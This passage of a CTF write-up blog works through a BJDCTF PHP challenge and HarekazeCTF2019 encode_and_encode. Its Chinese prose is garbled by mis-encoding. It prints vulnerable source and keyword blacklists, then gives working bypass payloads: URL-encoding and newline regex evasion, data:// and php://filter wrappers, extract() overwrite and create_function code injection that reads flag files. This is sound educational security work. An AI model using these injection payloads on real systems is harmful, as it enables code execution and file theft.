challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, $_GET[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, $code) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $code(<span class="string">&#x27;&#x27;</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="SERVER-â€˜QUERY-STRINGâ€™-ç»•è¿‡">$_SERVER[â€˜QUERY_STRINGâ€™]ç»•è¿‡</h4>
<p>éœ€è¦æ˜ç¡®ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š</p>
<p><code>$_SERVER['QUERY_STRING']</code>è¿”å›urlä¸­æŸ¥è¯¢çš„å­—ç¬¦ä¸²ï¼Œä¸æ­¤ç±»ä¼¼çš„è¿˜æœ‰ï¼š</p>
<ul>
<li><code>$_SERVER['REQUEST_URI']</code>è¿”å›è®¿é—®æ­¤é¡µé¢æ‰€éœ€çš„URI</li>
<li><code>$_SERVER['SCRIPT_NAME']</code>è¿”å›åŒ…å«å½“å‰è„šæœ¬çš„è·¯å¾„</li>
<li><code>$_SERVER['PHP_SELF']</code>å½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å</li>
</ul>
<p>ä¸¾ä¸ªä¾‹å­ï¼š(æµè§ˆå™¨è‡ªåŠ¨å°†fileçš„urlç¼–ç è§£ç äº†)</p>
<p><img src="https://www.moonback.xyz/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIM%E6%88%AA%E5%9B%BE20200210162052.png" alt="img"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>$_SERVER['QUERY_STRING']</code>å’Œ<code>$_SERVER['REQUEST_URI']</code>åœ¨ä¼ è¾“æ—¶ä¸ä¼šurlè§£ç ï¼Œè€Œ<code>$_GET</code>,<code>$_POST</code>ä¼šurlè§£ç ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥urlç¼–ç ç»•è¿‡ä¸‹é¢ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="preg-matchæ¢è¡Œç¬¦ç»•è¿‡">preg_matchæ¢è¡Œç¬¦ç»•è¿‡</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, $_GET[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>ç”±äºæ²¡æœ‰<code>/s</code>ä¿®é¥°ç¬¦ç”¨æ¥åœ¨åŒ¹é…æ—¶åŒ¹é…æ¢è¡Œç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>%0a</code>æ¢è¡Œæ±¡æŸ“ç»•è¿‡ã€‚</p>
<h4 id="REQUESTå­—æ¯åŒ¹é…ç»•è¿‡">$_REQUESTå­—æ¯åŒ¹é…ç»•è¿‡</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>$_REQUEST</code>åŒ…å«<code>_POST</code>ã€<code>_GET</code>å’Œ<code>COOKIE</code>ä¸‰ä¸ªå…¨å±€å˜é‡ï¼Œå¹¶ä¸”POSTå…·æœ‰æ›´é«˜çš„ä¼˜å…ˆå€¼ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥POSTåŒæ ·åç§°æ»¡è¶³æ¡ä»¶çš„å€¼ï¼Œæ¯”å¦‚æ•°å­—å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªåŒ¹é…ã€‚å¦å¤–ï¼Œæ•°ç»„ç±»å‹çš„æ•°æ®ä¸éœ€è¦POSTï¼Œ<code>preg_match()</code>åªèƒ½åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•°ç»„å¾—ä»¥ç»•è¿‡ã€‚</p>
<blockquote>
<p>æˆ‘åœ¨BUUOJä¸Šé¢åšè¿™ä¸ªé¢˜çš„æ—¶å€™ï¼Œä¸€ç›´ç»•ä¸è¿‡è¿™ä¸ªå­—æ¯åŒ¹é…ï¼Œå†ä»”ç»†ä¸€çœ‹ï¼Œå‘ç°æ˜¯buuè‡ªå¸¦çš„cookieçš„åŸå› ï¼Œåˆ æ‰å³å¯ã€‚</p>
</blockquote>
<h4 id="file-get-contentsæ¯”å¯¹ç»•è¿‡">file_get_contentsæ¯”å¯¹ç»•è¿‡</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>åˆšå¼€å§‹æƒ³çš„æ˜¯<code>php://input</code>ï¼Œåæ¥å‘ç°è¦POSTæ•°æ®ï¼Œå› æ­¤ä¾¿ä¸èƒ½ç”¨äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨<code>data://</code>ï¼Œç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>
<h4 id="sha1æ¯”è¾ƒ">sha1æ¯”è¾ƒ</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥æ•°ç»„ç»•è¿‡ã€‚</p>
<h4 id="extractå˜é‡è¦†ç›–">extractå˜é‡è¦†ç›–</h4>
<p>å› ä¸º<code>extract()</code>å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ï¼Œé’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¼ æ•°ç»„ï¼Œå³<code>flag[code]</code>å’Œ<code>flag[arg]</code>çš„å½¢å¼ã€‚</p>
<h4 id="create-functionä»£ç æ³¨å…¥">create_functionä»£ç æ³¨å…¥</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, $code) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $code(<span class="string">&#x27;&#x27;</span>, $arg); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åŸºæœ¬çš„æ³¨å…¥å½¢å¼ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myFunc = create_function(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return($a+$b);&#125;eval($_POST[1]);\\&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œæ—¶ç›¸å½“äºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆè¿™é“é¢˜ç¦ç”¨äº†å¾ˆå¤šç±»ä¼¼æ— å‚æ•°RCEçš„å‡½æ•°å…³é”®å­—ï¼Œä¹Ÿç¦ç”¨äº†å¾ˆå¤šè¯»æ–‡ä»¶çš„ç³»ç»Ÿå‘½ä»¤ã€‚</p>
<p>ä½†æ˜¯ä»£ç ä¸­å·²ç»åŒ…å«äº†<code>flag.php</code>ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨é‡Œé¢çš„å˜é‡ã€‚æ‰€ä»¥è¦æƒ³åŠæ³•åœ¨ä¸æŒ‡å®šå˜é‡åç§°çš„æƒ…å†µä¸‹è¾“å‡ºå˜é‡çš„å€¼ï¼Œå¯ä»¥æƒ³åˆ°ï¼š<strong>æ˜¯å¦å­˜åœ¨ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½è¾“å‡ºæ‰€æœ‰å˜é‡çš„å€¼ï¼Ÿ</strong></p>
<p>ç­”æ¡ˆæ˜¯<code>get_defined_vars()</code>ç”¨æ¥è¾“å‡ºæ‰€æœ‰å˜é‡å’Œå€¼ã€‚</p>
<p>é‚£ä¹ˆæ•´ä½“çš„payloadå°±æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line">POST: debu&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure>
<p>è§£ç åå°±æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line">POST: debu&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure>
<p>æ‰“å°äº†æ‰€æœ‰å˜é‡</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200717100826.png" alt=""></p>
<p>æç¤ºæˆ‘ä»¬çœŸçš„flagåœ¨<code>realfl4g.php</code>é‡Œé¢ï¼Œé‚£ä¹ˆå°±å»åŒ…å«<code>realfl4g.php</code>æ–‡ä»¶ã€‚</p>
<p>è¿™ä¸ªåœ°æ–¹è¿‡æ»¤äº†<code>include</code>å’Œå•å¼•å·ï¼Œå¯ä»¥ç”¨<code>require()</code>æ¥ä»£æ›¿ï¼Œè¿‡æ»¤<code>flag</code>å…³é”®å­—ï¼Œå°±ç”¨base64ç¼–ç ç»•è¿‡ã€‚é‚£ä¹ˆpayloadå°±æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1nD3x.php?</span><br><span class="line">file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67[%61%72%67]&#x3D;&#125;require(base64_%64%65%63%6f%64%65(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function</span><br><span class="line">POST: debu&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure>
<p>è§£ç å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;require(base64_decode(cmVhbGZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200717102737.png" alt=""></p>
<h4 id="å–åç»•è¿‡-ä¼ªåè®®è¯»å–æºç ">å–åç»•è¿‡+ä¼ªåè®®è¯»å–æºç </h4>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">POST: debu&#x3D;1&amp;file&#x3D;1</span><br></pre></td></tr></table></figure>
<p>è¯»åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Real_Flag In Here!!!&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;å’¦ï¼Œä½ å±…ç„¶æ‰¾åˆ°æˆ‘äº†ï¼Ÿï¼ä¸è¿‡çœ‹åˆ°è¿™å¥è¯ä¹Ÿä¸ä»£è¡¨ä½ å°±èƒ½æ‹¿åˆ°flagå“¦ï¼&quot;</span>;</span><br><span class="line">	$f4ke_flag = <span class="string">&quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;</span>;</span><br><span class="line">	$rea1_f1114g = <span class="string">&quot;flag&#123;b1fcb796-18ed-4790-96d4-42becc504efc&#125;&quot;</span>;</span><br><span class="line">	<span class="keyword">unset</span>($rea1_f1114g);</span><br></pre></td></tr></table></figure>
<p>åŸæ¥æ˜¯æŠŠå˜é‡ç»™é‡Šæ”¾äº†ã€‚</p>
<h3 id="æ‹“å±•-v3">æ‹“å±•</h3>
<p>ä»‹ç»ä¸€ç§éé¢„æœŸè§£ï¼š</p>
<h4 id="æ•°ç»„ç»•è¿‡">æ•°ç»„ç»•è¿‡</h4>
<p>åŠ äº†ä¸ªå‚æ•°ï¼Œä¼ ä¸Šå»ä¼ªåè®®ï¼Œç„¶å<code>get_defined_vars()</code>æ•°ç»„è·å–åˆ°è¿™ä¸ªä¼ªåè®®æ”¾åˆ°<code>require()</code>é‡ŒåŒ…å«ï¼Œpayloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?deb%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;%64%61%74%61%3a%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;rce&#x3D;%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%72%65%61%64%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%72%65%61%31%66%6c%34%67%2e%70%68%70&amp;rce2&#x3D;r&amp;sha%6e%61[]&#x3D;a&amp;pa%73sw%64[]&#x3D;b&amp;fla%67[co%64e]&#x3D;create_function&amp;fla%67[ar%67]&#x3D;;&#125;require(get_defined_vars()[_GET][rce]);%0a&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>è§£ç åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?debu&#x3D;aqua_is_cute</span><br><span class="line">&amp;file&#x3D;data:,debu_debu_aqua&amp;rce&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php&amp;rce2&#x3D;r&amp;shana[]&#x3D;a&amp;passwd[]&#x3D;b&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;;&#125;require(get_defined_vars()[_GET][rce]);</span><br><span class="line">&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="å‚è€ƒ">å‚è€ƒ</h3>
<p><a href="https://www.gem-love.com/ctf/770.html">https://www.gem-love.com/ctf/770.html</a></p>
<h2 id="HarekazeCTF2019-encode-and-encode">[HarekazeCTF2019]encode_and_encode</h2>
<h3 id="è€ƒç‚¹-v11">è€ƒç‚¹</h3>
<ul>
<li>jsonå­—ç¬¦è½¬ä¹‰</li>
<li>ä¼ªåè®®ç»•è¿‡</li>
</ul>
<h3 id="è§£é¢˜-v11">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$json = json_decode($body, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>
<p>å¤§æ¦‚å°±æ˜¯ä¼ ä¸€ä¸ªjsonç¼–ç çš„æ•°æ®ï¼Œç„¶åjsonè§£ç ï¼Œè¿›è¡Œis_validé»‘åå•è¿‡æ»¤ï¼Œç„¶åfile_get_contentsï¼Œå†ä¸€æ¬¡è¿›è¡Œé»‘åå•è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯æ—¢å¯¹åŸå§‹æ•°æ®ï¼Œåˆå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œç”±äºjsonä½¿æ”¯æŒunicodeç¼–ç çš„ï¼Œæ‰€ä»¥å¯ä»¥ç”¨unicodeä»£æ›¿å…³é”®å­—ï¼Œå¹¶ç”¨ä¼ªåè®®base64ç¼–ç ï¼Œpayload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\u0066\u006c\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å‚è€ƒ-v2">å‚è€ƒ</h3>
<p><a href="https://p1htmlkernalweb.mybluemix.net/articles/%5BHarekazeCTF2019%5Dencode_and_encode_3837296_csdn.html">https://p1htmlkernalweb.mybluemix.net/articles/[HarekazeCTF2019]encode_and_encode_3837296_csdn.html</a></p>
<h2 id="CISCN2019-æ€»å†³èµ›-Day1-Web4-Laravel1">[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1</h2>
<h3 id="TODO-v2">TODO</h3>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox">[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h2>
<h3 id="TODO-v3">TODO</h3>
<h2 id="HarekazeCTF2019-Easy-Notes">[HarekazeCTF2019]Easy Notes</h2>
